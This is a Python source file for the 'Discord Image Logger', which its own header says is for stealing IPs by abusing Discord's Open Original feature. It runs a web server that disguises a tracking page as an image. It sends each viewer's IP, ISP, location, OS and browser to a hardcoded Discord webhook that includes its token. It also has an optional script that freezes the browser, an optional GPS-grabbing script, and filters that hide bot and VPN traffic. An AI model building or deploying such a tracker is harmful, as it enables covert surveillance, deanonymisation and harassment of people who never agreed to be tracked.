# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1345802893009092618/QGtzgkwBZW2QZDyPyfC3Q12LmQdwT5qmtNlBPan79bBs7tdkpNN76EM-5Q_ZxcMJLuHb",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
